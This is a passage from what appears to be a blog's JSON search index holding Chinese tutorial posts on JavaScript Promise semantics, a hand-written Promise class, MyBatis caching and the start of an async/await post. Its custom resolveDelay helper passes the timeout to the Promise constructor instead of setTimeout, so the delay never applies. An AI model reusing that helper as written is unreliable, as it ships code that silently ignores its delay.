指定多个成功&#x2F;失败回调函数，都会调用吗？当 promise 改变为对应状态时都会调用\nconst p = new Promise((resolve, reject) =&gt; &#123;  //resolve(1)  reject(2)&#125;)p.then(  value =&gt; &#123;&#125;,  reason =&gt; &#123;console.log(&#x27;reason&#x27;,reason)&#125;)p.then(  value =&gt; &#123;&#125;,  reason =&gt; &#123;console.log(&#x27;reason2&#x27;,reason)&#125;)// reason 2// reason2 2\n\n3. 改变 promise 状态和指定回调函数谁先谁后？\n先执行resolve()，还是先指定then()中的回调？\n都有可能，常规是先指定回调再改变状态，但也可以先改状态再指定回调\n\n\n如何先改状态再指定回调？\n\n(1)在执行器中实现同步任务：直接调用 resolve()&#x2F;reject()\n\n(2)延迟更长时间才调用 then()\n\n\n\n\nlet p = new Promise((resolve, reject) =&gt; &#123;  // setTimeout(() =&gt; &#123;      resolve(&#x27;OK&#x27;);  // &#125;, 1000); // 有异步就先指定回调，否则先改变状态&#125;);p.then(value =&gt; &#123;  console.log(value);&#125;,reason=&gt;&#123;  &#125;)\n\n\n什么时候才能得到数据？( then()中的回调函数什么时候执行？)\n\n(1)如果先指定的回调，那当状态发生改变时，回调函数就会调用得到数据\n（指定回调 &#x3D;&gt; 改变状态 &#x3D;&gt; 执行回调）\n\n(2)如果先改变的状态，那当指定回调时，回调函数就会调用得到数据\n（改变状态 &#x3D;&gt; 指定回调 &#x3D;&gt; 执行回调）\n\n\n\n\nnew Promise((resolve, reject) =&gt; &#123;  setTimeout(() =&gt; &#123;    resolve(1) // 改变状态  &#125;, 1000)&#125;).then( // 指定回调函数 （先指定）  value =&gt; &#123;&#125;,  reason =&gt;&#123;&#125;)\n\n以上，先指定回调函数，保存当前指定的回调函数；后改变状态(同时指定数据)，然后异步执行之前保存的回调函数。\nnew Promise((resolve, reject) =&gt; &#123;  resolve(1) // 改变状态&#125;).then( // 指定回调函数  value =&gt; &#123;&#125;,  reason =&gt;&#123;&#125;)\n\n以上，先改变的状态(同时指定数据)，后指定回调函数(不需要再保存)，直接异步执行回调函数\n4. promise.then() 返回的新 promise 的结果状态由什么决定？(1) 简单表达：由 then() 指定的回调函数执行的结果决定\nlet p = new Promise((resolve, reject) =&gt; &#123;  resolve(&#x27;ok&#x27;);&#125;);//执行 then 方法let result = p.then(value =&gt; &#123;  console.log(value);     //因为这里没有返回值，所以是undefined&#125;, reason =&gt; &#123;  console.warn(reason);&#125;);console.log(result);\n\n\n(2) 详细表达：\n ① 如果抛出异常，新 promise 变为 rejected，reason 为抛出的异常\nlet p = new Promise((resolve, reject) =&gt; &#123;  resolve(&#x27;ok&#x27;);&#125;);//执行 then 方法let result = p.then(value =&gt; &#123;  //1. 抛出错误  throw &#x27;出了问题&#x27;;&#125;, reason =&gt; &#123;  console.warn(reason);&#125;);console.log(result);\n\n\n ② 如果返回的是非 promise 的任意值，新 promise 变为 resolved，value 为返回的值\nlet p = new Promise((resolve, reject) =&gt; &#123;  resolve(&#x27;ok&#x27;);&#125;);//执行 then 方法let result = p.then(value =&gt; &#123;\t//2. 返回结果是非 Promise 类型的对象\treturn 521;&#125;, reason =&gt; &#123;  console.warn(reason);&#125;);console.log(result);\n\n\n ③ 如果返回的是另一个新 promise，此 promise 的结果就会成为新 promise 的结果\nlet p = new Promise((resolve, reject) =&gt; &#123;  resolve(&#x27;ok&#x27;);&#125;);//执行 then 方法let result = p.then(value =&gt; &#123;\t//3. 返回结果是 Promise 对象\treturn new Promise((resolve, reject) =&gt; &#123;\t\t// resolve(&#x27;success&#x27;);\t\treject(&#x27;error&#x27;);\t&#125;);&#125;, reason =&gt; &#123;  console.warn(reason);&#125;);console.log(result);\n\n\n\n代码示例\nnew Promise((resolve, reject) =&gt; &#123;  resolve(1)&#125;).then(  value =&gt; &#123;    console.log(&#x27;onResolved1()&#x27;, value)  &#125;,  reason =&gt; &#123;    console.log(&#x27;onRejected1()&#x27;, reason)  &#125;).then(  value =&gt; &#123;    console.log(&#x27;onResolved2()&#x27;, value)  &#125;,  reason =&gt; &#123;    console.log(&#x27;onRejected2()&#x27;, reason)  &#125;)// onResolved1() 1// onResolved2() undefined\n\nnew Promise((resolve, reject) =&gt; &#123;  resolve(1)&#125;).then(  value =&gt; &#123;    console.log(&#x27;onResolved1()&#x27;, value)    //return 2                   // onResolved2() 2    //return Promise.resolve(3)  // onResolved2() 3    //return Promise.reject(4)   // onRejected2() 4    //throw 5                    // onRejected2() 5  &#125;,  reason =&gt; &#123;    console.log(&#x27;onRejected1()&#x27;, reason)  &#125;).then(  value =&gt; &#123;    console.log(&#x27;onResolved2()&#x27;, value)  &#125;,  reason =&gt; &#123;    console.log(&#x27;onRejected2()&#x27;, reason)  &#125;)// onResolved1() 1// onResolved2() undefined// Promise &#123;&lt;fulfilled&gt;: undefined&#125;// 对应输出如上所示\n\n5.promise 如何串联多个操作任务？(1)promise 的 then() 返回一个新的 promise，可以并成 then() 的链式调用\n(2)通过 then 的链式调用串联多个同步&#x2F;异步任务\nlet p = new Promise((resolve, reject) =&gt; &#123;  setTimeout(() =&gt; &#123;      resolve(&#x27;OK&#x27;);  &#125;, 1000);&#125;);p.then(value =&gt; &#123;  return new Promise((resolve, reject) =&gt; &#123;      resolve(&quot;success&quot;);  &#125;);&#125;).then(value =&gt; &#123;  console.log(value); // success     //因为这里没有返回值，所以下面输出undefined&#125;).then(value =&gt; &#123;  console.log(value); // undefined&#125;)\n\nnew Promise((resolve, reject) =&gt; &#123;  setTimeout(() =&gt; &#123;    console.log(&#x27;执行任务1(异步)&#x27;)    resolve(1)  &#125;, 1000)&#125;).then(  value =&gt; &#123;    console.log(&#x27;任务1的结果&#x27;, value)    console.log(&#x27;执行任务2(同步)&#x27;)    return 2 // 同步任务直接return返回结果  &#125;).then(  value =&gt; &#123;    console.log(&#x27;任务2的结果&#x27;, value)    return new Promise((resolve, reject) =&gt; &#123; // 异步任务需要包裹在Promise对象中      setTimeout(() =&gt; &#123;        console.log(&#x27;执行任务3(异步)&#x27;)        resolve(3)      &#125;, 1000)    &#125;)  &#125;).then(  value =&gt; &#123;    console.log(&#x27;任务3的结果&#x27;, value)  &#125;)// 执行任务1(异步)// 任务1的结果 1// 执行任务2(同步)// 任务2的结果 2// 执行任务3(异步)// 任务3的结果 3\n\n6.Promise 异常穿透(传透)？(1)当使用 promise 的 then 链式调用时，可以在最后指定失败的回调\n(2)前面任何操作出了异常，都会传到最后失败的回调中处理\nnew Promise((resolve, reject) =&gt; &#123;   //resolve(1)   reject(1)&#125;).then(  value =&gt; &#123;    console.log(&#x27;onResolved1()&#x27;, value)    return 2  &#125;).then(  value =&gt; &#123;    console.log(&#x27;onResolved2()&#x27;, value)    return 3  &#125;).then(  value =&gt; &#123;    console.log(&#x27;onResolved3()&#x27;, value)  &#125;).catch(  reason =&gt; &#123;    console.log(&#x27;onRejected1()&#x27;, reason)  &#125;)// onRejected1() 1\n\n相当于这种写法：多写了很多reason =&gt; &#123;throw reason&#125;\nnew Promise((resolve, reject) =&gt; &#123;   //resolve(1)   reject(1)&#125;).then(  value =&gt; &#123;    console.log(&#x27;onResolved1()&#x27;, value)    return 2  &#125;,  reason =&gt; &#123;throw reason&#125; // 抛出失败的结果reason).then(  value =&gt; &#123;    console.log(&#x27;onResolved2()&#x27;, value)    return 3  &#125;,  reason =&gt; &#123;throw reason&#125; // 抛出失败的结果reason).then(  value =&gt; &#123;    console.log(&#x27;onResolved3()&#x27;, value)  &#125;,  reason =&gt; &#123;throw reason&#125; // 抛出失败的结果reason).catch(  reason =&gt; &#123;    console.log(&#x27;onRejected1()&#x27;, reason)  &#125;)// onRejected1() 1\n\n所以失败的结果是一层一层处理下来的，最后传递到 catch 中。\n或者，将 reason =&gt; &#123;throw reason&#125; 替换为 reason =&gt; Promise.reject(reason) 也是一样的\n7.中断 promise 链？当使用 promise 的 then 链式调用时，在中间中断，不再调用后面的回调函数\n办法：在回调函数中返回一个 pending 状态的 promise 对象\nlet p = new Promise((resolve, reject) =&gt; &#123;    setTimeout(() =&gt; &#123;        resolve(&#x27;OK&#x27;);    &#125;, 1000);&#125;);p.then(value =&gt; &#123;    console.log(111);    //有且只有一个方式    return new Promise(() =&gt; &#123;&#125;);    // 返回一个pending的promise&#125;).then(value =&gt; &#123;    console.log(222);&#125;).then(value =&gt; &#123;    console.log(333);&#125;).catch(reason =&gt; &#123;    console.warn(reason);&#125;);\n\n在 then 中返回一个新的 promise，因为这个对象状态没有改变，所以没有结果。\n由于，返回的新的 promise 结果决定了后面 then 中的结果，所以后面的 then 中也没有结果。\n这就实现了中断 promise链的效果。\n","categories":["Promise"],"tags":["Promise"]},{"title":"Promise（二）：自定义（手写）Promise（源码解析）","url":"/2022/04/21/Promise%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E8%87%AA%E5%AE%9A%E4%B9%89%EF%BC%88%E6%89%8B%E5%86%99%EF%BC%89Promise/","content":"1. 整体结构框架/** * 自定义Promise函数模块：IIFE */(function (window) &#123;  const PENDING = &#x27;pending&#x27;  const RESOLVED = &#x27;fulfilled&#x27;  const REJECTED = &#x27;rejected&#x27;  /**   * Promise构造函数   * @param &#123;function&#125; executor 执行器函数（同步执行）(resolve, reject) =&gt; &#123;&#125;   */  function Promise(executor) &#123;    &#125;  /**   * Promise原型对象then方法    * 指定成功和失败的回调函数   * @param &#123;function&#125; onResolved 成功的回调函数(value) =&gt; &#123;&#125;   * @param &#123;function&#125; onRejected 失败的回调函数(reason) =&gt; &#123;&#125;   * @returns 一个新的promise对象结果由onResolved/onRejected执行的结果决定   */  Promise.prototype.then = function (onResolved, onRejected) &#123;      &#125;  /**   * Promise原型对象catch方法   * 指定失败的回调函数   * @param &#123;function&#125; onRejected 失败的回调函数(reason) =&gt; &#123;&#125;   * @returns 一个新的promise对象   */  Promise.prototype.catch = function (onRejected) &#123;      &#125;  /**   * Promise函数对象resolve方法   * @param &#123;*&#125; value 成功的值   * @returns 一个成功/失败的promise   */   Promise.resolve = function (value) &#123;  &#125;  /**   * Promise函数对象reject方法   * @param &#123;*&#125; resaon 失败的原因   * @returns 一个失败的promise   */  Promise.reject = function (resaon) &#123;  &#125;  /**   * Promise函数对象all方法   * @param &#123;Array&lt;Promise&gt;&#125; promises    * @returns 一个promise，只有当所有promise都成功时才成功，否则只要有一个失败就失败   */  Promise.all = function (promises) &#123;  &#125;  /**   *Promise函数对象race方法   * @param &#123;Array&lt;Promise&gt;&#125; promises    * @returns 返回 一个promise，其结果由第一个完成的promise决定   */  Promise.race = function (promises) &#123;  &#125;  // 向外暴露Promise函数  window.Promise = Promise&#125;)(window)\n\n2. Promise(executor)\nPromise构造函数\nexecutor: 执行器函数（同步执行）\n\n/** * Promise构造函数 * @param &#123;*&#125; executor 执行器函数（同步执行）(resolve, reject) =&gt; &#123;&#125; */function Promise(executor) &#123;  const self = this; // 保存当前实例对象的this的值  // 添加属性  self.PromiseState = PENDING // 给promise对象指定status属性，初始值为pending  self.PromiseResult = null // 给promise对象指定一个用于存储结果数据的属性  self.callbacks = [] // 存的是对象 每个元素的结构：&#123;onResolved() &#123;&#125;, onRejected() &#123;&#125;&#125;  /**   * executor内部定义成功时调用的函数   * @param &#123;*&#125; value 成功的值   * @returns    */  function resolve(value) &#123;    // 如果当前状态不是pending，直接结束    if (self.PromiseState !== PENDING) return    // 1. 修改对象的状态（promiseState）为 fulfilled    self.PromiseState = RESOLVED     // 2. 设置对象结果值（promiseResult）为 value    self.PromiseResult = value    // 如果有待执行的callback函数，立即【异步】执行回调函数onResolved    if (self.callbacks.length &gt; 0) &#123;      setTimeout(() =&gt; &#123; // 放入队列中执行所有成功的回调        self.callbacks.forEach(callbacksObj =&gt; &#123;          callbacksObj.onResolved(value)        &#125;)      &#125;, 0)    &#125;  &#125;    /**   * executor内部定义失败时调用的函数   * @param &#123;*&#125; reason 失败的原因   * @returns    */  function reject(reason) &#123;    // 如果当前状态不是pending，直接结束    if (self.PromiseState !== PENDING) return    // 1. 修改对象的状态（promiseState）为 rejected    self.PromiseState = REJECTED    // 2. 设置对象结果值（promiseResult）为 reason    self.PromiseResult = reason    // 如果有待执行的callback函数，立即【异步】执行回调函数onRejected    if (self.callbacks.length &gt; 0) &#123;      setTimeout(() =&gt; &#123; // 放入队列中执行所有失败的回调        self.callbacks.forEach(callbacksObj =&gt; &#123;          callbacksObj.onRejected(reason)        &#125;)      &#125;, 0)    &#125;  &#125;    // 立即【同步】执行executor函数  try &#123;    executor(resolve, reject)  &#125; catch(error) &#123; // 如果执行器抛出异常，promise对象变成rejected状态    reject(error)  &#125;&#125;\n\n3. Promise.prototype.thenPromise.prototype.then = function (onResolved, onRejected) &#123;  const self = this  return new Promise((resolve, reject) =&gt; &#123;    if (self.PromiseState === PENDING) &#123; // 假如当前状态还是pending状态，将回调函数保存起来      self.callbacks.push(&#123;        onResolved(value) &#123;          // onResolved(self.PromiseResult)          try &#123;            const result = onResolved(self.PromiseResult) // 执行成功的回调 result接收返回值            if (result instanceof Promise) &#123; // 3. 如果回调函数返回的是promise              // result.then(              //   value =&gt; &#123;              //     resolve(value) // 当result成功时，让return的promise也成功              //   &#125;,              //   reason =&gt; &#123;              //     reject(reason) // 当result失败时，让return的promise也失败              //   &#125;              // )              result.then(resolve, reject) // 简洁写法            &#125; else &#123; // 2. 如果回调函数返回的不是promise              resolve(result)            &#125;          &#125; catch (error) &#123; //1. 如果抛出异常            reject(error)          &#125;         &#125;,        onRejected(reason) &#123;          // onRejected(self.PromiseResult)          try &#123;            const result = onRejected(self.PromiseResult) // 执行失败的回调 result接收返回值            if (result instanceof Promise) &#123; // 3. 如果回调函数返回的是promise              result.then(resolve, reject)            &#125; else &#123; // 2. 如果回调函数返回的不是promise              resolve(result)            &#125;          &#125; catch (error) &#123; //1. 如果抛出异常            reject(error)          &#125;         &#125;      &#125;)    &#125; else if (self.PromiseState === RESOLVED) &#123; // resolved      setTimeout(() =&gt; &#123;        /**         * 1. 如果抛出异常，return的promise就会失败，reason是error         * 2. 如果回调函数返回的不是promise，return的promise就会成功，value就是返回的值         * 3. 如果回调函数返回的是promise，return的promise结果就是这个promise的结果         */        try &#123;          const result = onResolved(self.PromiseResult) // 执行成功的回调 result接收返回值          if (result instanceof Promise) &#123; // 3. 如果回调函数返回的是promise            // result.then(            //   value =&gt; &#123;            //     resolve(value) // 当result成功时，让return的promise也成功            //   &#125;,            //   reason =&gt; &#123;            //     reject(reason) // 当result失败时，让return的promise也失败            //   &#125;            // )            result.then(resolve, reject) // 简洁写法          &#125; else &#123; // 2. 如果回调函数返回的不是promise            resolve(result)          &#125;        &#125; catch (error) &#123; //1. 如果抛出异常          reject(error)        &#125;      &#125;, 0)    &#125; else &#123; // rejected      setTimeout(() =&gt; &#123;        try &#123;          const result = onRejected(self.PromiseResult) // 执行失败的回调 result接收返回值          if (result instanceof Promise) &#123; // 3. 如果回调函数返回的是promise            result.then(resolve, reject)          &#125; else &#123; // 2. 如果回调函数返回的不是promise            resolve(result)          &#125;        &#125; catch (error) &#123; //1. 如果抛出异常          reject(error)        &#125;      &#125;, 0)    &#125;  &#125;)&#125;\n\n简化封装一下\n/** * Promise原型对象then方法  * 指定成功和失败的回调函数 * @param &#123;function&#125; onResolved 成功的回调函数(value) =&gt; &#123;&#125; * @param &#123;function&#125; onRejected 失败的回调函数(reason) =&gt; &#123;&#125; * @returns 一个新的promise对象结果由onResolved/onRejected执行的结果决定 */Promise.prototype.then = function (onResolved, onRejected) &#123;  // 指定默认的成功的回调onResolved （向后传递成功的value）  onResolved = typeof onResolved === &#x27;function&#x27; ? onResolved : value =&gt; value  // 指定默认的失败的回调onRejected（向后传递失败的reason 实现错误/异常传透的关键点）  onRejected = typeof onRejected === &#x27;function&#x27; ? onRejected : reason =&gt; &#123;throw reason&#125;  const self = this  return new Promise((resolve, reject) =&gt; &#123;    /**     * 调用指定回调函数处理，根据执行的结果改变return的promise的状态     * @param &#123;function&#125; callback 指定回调函数     */    function handle(callback) &#123;      try &#123;        const result = callback(self.PromiseResult) // result获取回调函数执行(return)的结果        if (result instanceof Promise) &#123; // 3. 如果回调函数返回的是promise          result.then(resolve, reject) // 简洁写法        &#125; else &#123; // 2. 如果回调函数返回的不是promise          resolve(result)        &#125;      &#125; catch (error) &#123; //1. 如果抛出异常        reject(error)      &#125;    &#125;    if (self.PromiseState === PENDING) &#123; // 1. 当前状态是pending状态，将回调函数保存起来      self.callbacks.push(&#123;        onResolved(value) &#123; //执行成功的回调函数，改promise的状态          handle(onResolved)         &#125;,        onRejected(reason) &#123; //执行失败的回调函数，改promise的状态          handle(onRejected)         &#125;      &#125;)    &#125; else if (self.PromiseState === RESOLVED) &#123; // 2. resolved，【异步】执行onResolved并改变return的promise的状态      setTimeout(() =&gt; &#123;        handle(onResolved)      &#125;, 0)    &#125; else &#123; // 3. rejected，【异步】执行onRejected并改变return的promise的状态      setTimeout(() =&gt; &#123;        handle(onRejected)      &#125;, 0)    &#125;  &#125;)&#125;\n\n4. Promise.prototype.catch/** * Promise原型对象catch方法 * 指定失败的回调函数 * @param &#123;function&#125; onRejected 失败的回调函数(reason) =&gt; &#123;&#125; * @returns 一个新的promise对象 */Promise.prototype.catch = function (onRejected) &#123;  return this.then(undefined, onRejected)&#125;\n\n5. Promise.resolve/** * Promise函数对象resolve方法 * @param &#123;*&#125; value 成功的值 * @returns 一个成功/失败的promise */Promise.resolve = function (value) &#123;  // 返回一个成功/失败的promise  return new Promise((resolve, reject) =&gt; &#123;    if (value instanceof Promise) &#123; // value是promise =&gt; 使用value的结果作为promise的结果      value.then(resolve,reject)    &#125; else &#123; // value不是promise =&gt; promise状态变为成功，数据是value      resolve(value)    &#125;  &#125;)&#125;\n\n6. Promise.reject/** * Promise函数对象reject方法 * @param &#123;*&#125; resaon 失败的原因 * @returns 一个失败的promise */Promise.reject = function (reason) &#123;  // 返回一个失败的promise  return new Promise((resolve, reject) =&gt; &#123;    reject(reason)  &#125;)&#125;\n\n7. Promise.all/** * Promise函数对象all方法 * @param &#123;Array&lt;Promise&gt;&#125; promises  * @returns 一个promise，只有当所有promise都成功时才成功，否则只要有一个失败就失败 */Promise.all = function (promises) &#123;  return new Promise((resolve, reject) =&gt; &#123;    let count = 0 // 声明计数变量    // const values = []; // 保存每个成功promise结果的数组    const values = new Array(promises.length) // 指定数组长度    for (let i = 0; i &lt; promises.length; i++)&#123;      // promises[i].then(value =&gt; &#123;      Promise.resolve(promises[i]).then(value =&gt; &#123; // 防止数组中有不是promise的元素        // 得知对象状态是成功        count++        // 将当前promise对象成功的结果存入到数组中        values[i] = value        if (count === promises.length) &#123; //每个promise对象都成功          resolve(values) // 修改函数状态        &#125;      &#125;, reason =&gt; &#123;          reject(reason)        &#125;)    &#125;  &#125;)&#125;\n\n8. Promise.race/** *Promise函数对象race方法 * @param &#123;Array&lt;Promise&gt;&#125; promises  * @returns 返回 一个promise，其结果由第一个完成的promise决定 */Promise.race = function (promises) &#123;  return new Promise((resolve, reject) =&gt; &#123;    for (let i = 0; i &lt; promises.length; i++)&#123;      // promises[i].then(value =&gt; &#123;      Promise.resolve(promises[i]).then(value =&gt; &#123; // 防止数组中有不是promise的元素        // 修改返回对象的状态为 成功        resolve(value)      &#125;, reason =&gt; &#123;        reject(reason)      &#125;)    &#125;  &#125;)&#125;\n\n9. 自定义函数对象方法Promise.resolveDelay&amp;Promise.rejectDelay/** * 自定义方法 延时返回一个成功/失败的promise * @param &#123;*&#125; value 成功的数据 * @param &#123;Number&#125; timeout 延迟时间 * @returns 一个成功/失败的promise */Promise.resolveDelay = function (value, timeout) &#123;  // 延时返回一个成功/失败的promise  return new Promise((resolve, reject) =&gt; &#123;    setTimeout(() =&gt; &#123;      if (value instanceof Promise) &#123; // value是promise =&gt; 使用value的结果作为promise的结果        value.then(resolve,reject)      &#125; else &#123; // value不是promise =&gt; promise状态变为成功，数据是value        resolve(value)      &#125;    &#125;)  &#125;, timeout);&#125;/** * 自定义方法 延时返回一个失败的promise * @param &#123;*&#125; reason 失败的原因 * @param &#123;*&#125; timeout 延迟时间 * @returns 一个失败的promise */Promise.rejectDelay = function (reason, timeout) &#123;  // 延时返回一个失败的promise  return new Promise((resolve, reject) =&gt; &#123;    setTimeout(() =&gt; &#123;      reject(reason)    &#125;, timeout)  &#125;)&#125;\n\n10. class写法/** * 自定义Promise函数模块：IIFE */(function (window) &#123;  const PENDING = &#x27;pending&#x27;  const RESOLVED = &#x27;fulfilled&#x27;  const REJECTED = &#x27;rejected&#x27;  class Promise &#123;    /**     * Promise构造函数     * @param &#123;function&#125; executor 执行器函数（同步执行）(resolve, reject) =&gt; &#123;&#125;     */    constructor(executor) &#123;      const self = this; // 保存当前实例对象的this的值      // 添加属性      self.PromiseState = PENDING // 给promise对象指定status属性，初始值为pending      self.PromiseResult = null // 给promise对象指定一个用于存储结果数据的属性      self.callbacks = [] // 存的是对象 每个元素的结构：&#123;onResolved() &#123;&#125;, onRejected() &#123;&#125;&#125;      /**       * executor内部定义成功时调用的函数       * @param &#123;*&#125; value 成功的值       * @returns        */      function resolve(value) &#123;        // 如果当前状态不是pending，直接结束        if (self.PromiseState !== PENDING) return        // 1. 修改对象的状态（promiseState）为 fulfilled        self.PromiseState = RESOLVED        // 2. 设置对象结果值（promiseResult）为 value        self.PromiseResult = value        // 如果有待执行的callback函数，立即【异步】执行回调函数onResolved        if (self.callbacks.length &gt; 0) &#123;          setTimeout(() =&gt; &#123; // 放入队列中执行所有成功的回调            self.callbacks.forEach(callbacksObj =&gt; &#123;              callbacksObj.onResolved(value)            &#125;)          &#125;, 0)        &#125;      &#125;          /**       * executor内部定义失败时调用的函数       * @param &#123;*&#125; reason 失败的原因       * @returns        */      function reject(reason) &#123;        // 如果当前状态不是pending，直接结束        if (self.PromiseState !== PENDING) return        // 1. 修改对象的状态（promiseState）为 rejected        self.PromiseState = REJECTED        // 2. 设置对象结果值（promiseResult）为 reason        self.PromiseResult = reason        // 如果有待执行的callback函数，立即【异步】执行回调函数onRejected        if (self.callbacks.length &gt; 0) &#123;          setTimeout(() =&gt; &#123; // 放入队列中执行所有失败的回调            self.callbacks.forEach(callbacksObj =&gt; &#123;              callbacksObj.onRejected(reason)            &#125;)          &#125;, 0)        &#125;      &#125;          // 立即【同步】执行executor函数      try &#123;        executor(resolve, reject)      &#125; catch (error) &#123; // 如果执行器抛出异常，promise对象变成rejected状态        reject(error)      &#125;    &#125;    /**     * Promise原型对象then方法      * 指定成功和失败的回调函数     * @param &#123;function&#125; onResolved 成功的回调函数(value) =&gt; &#123;&#125;     * @param &#123;function&#125; onRejected 失败的回调函数(reason) =&gt; &#123;&#125;     * @returns 一个新的promise对象结果由onResolved/onRejected执行的结果决定     */    then (onResolved, onRejected) &#123;      // 指定默认的成功的回调onResolved （向后传递成功的value）      onResolved = typeof onResolved === &#x27;function&#x27; ? onResolved : value =&gt; value      // 指定默认的失败的回调onRejected（向后传递失败的reason 实现错误/异常传透的关键点）      onRejected = typeof onRejected === &#x27;function&#x27; ? onRejected : reason =&gt; &#123;throw reason&#125;      const self = this      return new Promise((resolve, reject) =&gt; &#123;        /**         * 调用指定回调函数处理，根据执行的结果改变return的promise的状态         * @param &#123;function&#125; callback 指定回调函数         */        function handle(callback) &#123;          try &#123;            const result = callback(self.PromiseResult) // result获取回调函数执行(return)的结果            if (result instanceof Promise) &#123; // 3. 如果回调函数返回的是promise              result.then(resolve, reject) // 简洁写法            &#125; else &#123; // 2. 如果回调函数返回的不是promise              resolve(result)            &#125;          &#125; catch (error) &#123; //1. 如果抛出异常            reject(error)          &#125;        &#125;        if (self.PromiseState === PENDING) &#123; // 1. 当前状态是pending状态，将回调函数保存起来          self.callbacks.push(&#123;            onResolved(value) &#123; //执行成功的回调函数，改promise的状态              handle(onResolved)            &#125;,            onRejected(reason) &#123; //执行失败的回调函数，改promise的状态              handle(onRejected)            &#125;          &#125;)        &#125; else if (self.PromiseState === RESOLVED) &#123; // 2. resolved，【异步】执行onResolved并改变return的promise的状态          setTimeout(() =&gt; &#123;            handle(onResolved)          &#125;, 0)        &#125; else &#123; // 3. rejected，【异步】执行onRejected并改变return的promise的状态          setTimeout(() =&gt; &#123;            handle(onRejected)          &#125;, 0)        &#125;      &#125;)    &#125;    /**     * Promise原型对象catch方法     * 指定失败的回调函数     * @param &#123;function&#125; onRejected 失败的回调函数(reason) =&gt; &#123;&#125;     * @returns 一个新的promise对象     */    catch (onRejected) &#123;      return this.then(undefined, onRejected)    &#125;    /**     * Promise函数对象resolve方法     * @param &#123;*&#125; value 成功的值     * @returns 一个成功/失败的promise     */    static resolve(value) &#123;      // 返回一个成功/失败的promise      return new Promise((resolve, reject) =&gt; &#123;        if (value instanceof Promise) &#123; // value是promise =&gt; 使用value的结果作为promise的结果          value.then(resolve,reject)        &#125; else &#123; // value不是promise =&gt; promise状态变为成功，数据是value          resolve(value)        &#125;      &#125;)    &#125;    /**     * Promise函数对象reject方法     * @param &#123;*&#125; resaon 失败的原因     * @returns 一个失败的promise     */    static reject (reason) &#123;      // 返回一个失败的promise      return new Promise((resolve, reject) =&gt; &#123;        reject(reason)      &#125;)    &#125;      /**     * Promise函数对象all方法     * @param &#123;Array&lt;Promise&gt;&#125; promises      * @returns 一个promise，只有当所有promise都成功时才成功，否则只要有一个失败就失败     */     static all (promises) &#123;      return new Promise((resolve, reject) =&gt; &#123;        let count = 0 // 声明计数变量        // const values = []; // 保存每个成功promise结果的数组        const values = new Array(promises.length) // 指定数组长度        for (let i = 0; i &lt; promises.length; i++)&#123;          // promises[i].then(value =&gt; &#123;            Promise.resolve(promises[i]).then(value =&gt; &#123; // 防止数组中有不是promise的元素            // 得知对象状态是成功            count++            // 将当前promise对象成功的结果存入到数组中            values[i] = value            if (count === promises.length) &#123; //每个promise对象都成功              resolve(values) // 修改函数状态            &#125;          &#125;, reason =&gt; &#123;              reject(reason)            &#125;)        &#125;      &#125;)    &#125;    /**     *Promise函数对象race方法    * @param &#123;Array&lt;Promise&gt;&#125; promises     * @returns 返回 一个promise，其结果由第一个完成的promise决定    */    static race (promises) &#123;      return new Promise((resolve, reject) =&gt; &#123;        for (let i = 0; i &lt; promises.length; i++)&#123;          // promises[i].then(value =&gt; &#123;          Promise.resolve(promises[i]).then(value =&gt; &#123; // 防止数组中有不是promise的元素            // 修改返回对象的状态为 成功            resolve(value)          &#125;, reason =&gt; &#123;            reject(reason)          &#125;)        &#125;      &#125;)    &#125;    /**     * 自定义方法 延时返回一个成功/失败的promise     * @param &#123;*&#125; value 成功的数据     * @param &#123;Number&#125; timeout 延迟时间     * @returns 一个成功/失败的promise     */    static resolveDelay (value, timeout) &#123;      // 延时返回一个成功/失败的promise      return new Promise((resolve, reject) =&gt; &#123;        setTimeout(() =&gt; &#123;          if (value instanceof Promise) &#123; // value是promise =&gt; 使用value的结果作为promise的结果            value.then(resolve,reject)          &#125; else &#123; // value不是promise =&gt; promise状态变为成功，数据是value            resolve(value)          &#125;        &#125;)      &#125;, timeout);    &#125;    /**     * 自定义方法 延时返回一个失败的promise     * @param &#123;*&#125; reason 失败的原因     * @param &#123;*&#125; timeout 延迟时间     * @returns 一个失败的promise     */     static rejectDelay (reason, timeout) &#123;      // 延时返回一个失败的promise      return new Promise((resolve, reject) =&gt; &#123;        setTimeout(() =&gt; &#123;          reject(reason)        &#125;, timeout)      &#125;)    &#125;  &#125;  // 向外暴露Promise函数  window.Promise = Promise&#125;)(window)\n\n","categories":["Promise"],"tags":["手写Promise"]},{"title":"MyBatis","url":"/2023/02/15/SSM%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AMyBatis/","content":"MyBatis的缓存一级缓存MyBatis的以及缓存是SqlSession级别的，即通过同一个SqlSession查询的数据会被缓存，再次使用同一个SqlSession查询同一条数据，会从缓存中获取\n一级缓存默认开启\n一级缓存失效的情况：\n\n不同的对应不同的一级缓存\n同一个SqlSession，但查询条件不同\n同一个SqlSession，但两次查询期间执行了任何一次增删改操作（因为增删改有可能对记录进行更新，可能会导致缓存中的数据与数据库中的数据不一致）\n同一个SqlSession，但两次查询期间手动清空了缓存sqlSession.clearCache()\n\n二级缓存MyBatis的以及缓存是SqlSessionFactory级别的，即通过同一个SqlSessionFactory创建的SqlSession查询结果会被缓存，此后再次执行相同的查询语句，结果就会从缓存中获取\n二级缓存开启条件：\n\n在核心配置文件中，设置全局配置属性cacheEnabled&#x3D;“true”，默认为true，不需要设置\n在映射文件中设置标签&lt;cache /&gt;\n二级缓存必须在SqlSession关闭或提交之后有效\n查询的数据所转换的实体类类型必须实现序列化的接口\n\n二级缓存失效的情况：\n\n两次查询期间执行了任何一次增删改操作（一级二级同时失效）\n\n缓存查询的顺序先查询二级缓存，因为二级缓存中可能会有其他程序已经查出来的数据，可以拿来直接使用。\n如果二级缓存没有命中，再查询一级缓存\n如果一级缓存也没有命中，则查询数据库\nSqlSession关闭之后，一级缓存中的数据会写入二级缓存\n","categories":["SSM"],"tags":["MyBatis"]},{"title":"Promise（三）：async与await","url":"/2022/04/22/Promise%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9Aasync%E4%B8%8Eawait/","content":"参考笔记\nPromise+ async + await1)Promise&#x3D;&#x3D;&gt;异步2)await&#x3D;&#x3D;&gt;异步转同步\nawait 可以理解为是 async wait 的简写。await 必须出现在 async 函数内部，不能单独使用。\nawait 后面可以跟任何的JS 表达式。虽然说 await 可以等很多类型的东西，但是它最主要的意图是用来等待 Promise 对象的状态被 resolved。如果await的是 promise对象会造成异步函数停止执行并且等待 promise 